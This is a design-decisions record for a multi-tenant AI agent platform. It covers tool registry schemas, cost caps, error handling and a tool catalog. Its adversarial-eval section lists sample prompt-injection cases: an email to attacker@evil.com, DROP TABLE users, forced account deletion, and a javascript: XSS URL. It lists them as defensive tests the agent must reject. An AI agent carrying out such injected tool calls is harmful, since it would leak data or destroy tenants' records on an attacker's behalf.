# DECISIONS — `saas-agent-platform`

Per ADR-0008 §7. Inherits from `saas-multitenant-baseline/DECISIONS.md`.

## Agent framework

| Decision             | Choice                                    | Reasoning                                                                                    |
| -------------------- | ----------------------------------------- | -------------------------------------------------------------------------------------------- |
| Framework            | **Vercel AI SDK + custom orchestration**  | LangGraph is heavier; Pydantic AI is Python; the AI SDK + our own loop is simple + auditable |
| Step graph           | Linear with retries (no DAG) at v0.1      | DAGs in v1.1 when tool-composition demands it                                                |
| Tool registry        | Zod schemas per tool, statically declared | No runtime tool discovery — every tool is in the registry, every call is type-checked        |
| Tool-call validation | Per-session whitelist (ADR-0010 §2.10)    | Rejects out-of-band tool calls                                                               |

## Step + cost discipline

| Knob                       | Default | Notes                                              |
| -------------------------- | ------- | -------------------------------------------------- |
| Max steps                  | 20      | Hard cap from `inputs.maxSteps`. Cannot exceed 50. |
| Step budget for replanning | 3       | Stuck-state forced exit                            |
| Cost per invocation cap    | $1.00   | Enforced by `@nexural/sdk.llmClient`               |
| Observation persistence    | 30 days | 7 years for fintech variants                       |

## Tool registry shape

```ts
type ToolDef<I, O> = {
  name: string; // kebab-case per NAMING.md
  description: string; // shown to LLM
  inputSchema: z.ZodType<I>; // per-arg Zod
  outputSchema: z.ZodType<O>;
  confirmationRequired?: boolean; // pause + UI prompt
  scope?: "tenant" | "user" | "platform"; // RLS enforcement
  costEstimateUsd?: (input: I) => number; // pre-flight cost projection
  handler: (input: I, ctx: ToolCtx) => Promise<O>;
};
```

## Adversarial eval (per ADR-0010 §2.10)

Recipe ships `eval/adversarial.json` with ≥10 prompt-injection-via-tool-call
cases. `recipe-validity` requires 100% rejection rate.

Examples:

- `delete_account(confirm=true)` requested via retrieved doc
- `send_email(to="attacker@evil.com")` requested via tool input
- `database_query("DROP TABLE users")` requested via system prompt manipulation
- `web_fetch(url="javascript:alert(1)")` XSS attempt

## Tool error behavior

| Scenario                | Behavior                                                    |
| ----------------------- | ----------------------------------------------------------- |
| Zod validation fails    | Reject immediately. Don't retry. Log security event.        |
| Tool not in whitelist   | Reject. Log. Return synthesis error to user.                |
| Tool throws (transient) | Retry once with exponential backoff                         |
| Tool throws (terminal)  | Stop agent. Surface error in conversation.                  |
| Confirmation declined   | Stop step. Continue with alternate path or exit gracefully. |

## Tool catalog (initial)

| Tool                    | Scope  | Confirmation? | Description                                             |
| ----------------------- | ------ | ------------- | ------------------------------------------------------- |
| `search-knowledge-base` | tenant | no            | Vector search over tenant docs                          |
| `fetch-url`             | tenant | no            | Whitelisted HTTPS-only URL fetch                        |
| `send-email`            | tenant | yes           | Via Resend; rate-limited; recipient on tenant allowlist |
| `query-database`        | tenant | no            | Read-only tenant-scoped SQL via parameterized client    |
| `update-record`         | tenant | yes           | Single-row updates with audit log entry                 |
| `schedule-task`         | tenant | no            | Defers tool call to background job                      |

More tools = forge-time input via `additionalTools` array.

## Models (per ADR-0007)

Same chain as `saas-rag-chat`: Opus → OpenAI flagship → Ollama.

## Observation persistence

```sql
create table agent_observations (
  id uuid primary key,
  agent_invocation_id uuid not null,
  tenant_id uuid not null,
  user_id uuid not null,
  step_index int4 not null,
  step_data jsonb,                    -- prompt, model, tool calls, responses
  cost_usd numeric(10, 6),
  latency_ms int4,
  created_at timestamptz not null default now()
);
```

Indexed by `agent_invocation_id`, partitioned monthly if volume warrants.

## CHANGELOG

- **2026-05-22** v0.1.0 — Initial. Tool registry + whitelist + cost cap discipline locked.
